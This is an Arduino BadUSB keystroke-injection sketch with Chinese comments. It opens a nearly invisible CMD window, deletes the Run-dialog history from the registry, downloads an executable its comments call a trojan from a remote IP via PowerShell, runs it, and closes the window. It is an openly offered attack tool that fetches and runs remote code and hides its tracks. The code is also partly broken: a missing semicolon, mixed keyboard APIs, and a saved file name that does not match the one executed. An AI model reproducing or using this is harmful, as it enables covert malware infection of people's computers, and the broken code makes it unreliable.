#include<Keyboard.h>

void setup() 
{ //初始化，这里的代码只执行一次
delay(5000); //设置延时，让系统有足够的时间识别BadUsb5，防止后续代码执行错乱。
delay(1000);Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');Keyboard.releaseAll();delay(500);//针对shift+ctrl切换输入法
Keyboard.press(KEY_LEFT_SHIFT);Keyboard.press(KEY_LEFT_CTRL);//针对win8及以上部分操作系统改换中文输入
Keyboard.press(KEY_LEFT_GUI);Keyboard.println(' ');//某些输入法的中英文切换
Keyboard.press(KEY_LEFT_SHIFT);//暴力直接切换成英文
Keyboard.press(KEY_CAPS_LOCK)//手动释放按键
Keyboard.releaseAll();
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); // 按下Win键
Keyboard.set_key1(KEY_R); // 同时按下R键
Keyboard.send_now(); // 发送Win+R
delay(100);
Keyboard.print("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
//开启极小的CMD窗口，设置文字和背景对比度尽可能相近，达到隐藏输入的目的
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(300);
Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f"); //利用注册表清除开始--运行的记录
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
Keyboard.println("powershell (new- object System.Net.WebClient).DownloadFile('http://196.168.x.x/a.exe','D://b.exe')"); //下载木马并选择储存位置
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(3000); //设置延迟，等待下载完成
Keyboard.println("D://1.exe"); //执行打开命令
Keyboard.set_key1(KEY_ENTER);
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_SPACE);
Keyboard.set_key2(KEY_C);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.set_key2(0);
Keyboard.send_now(); //关闭cmd窗口
}

void loop() //循环，这里的代码无限循环
{
}
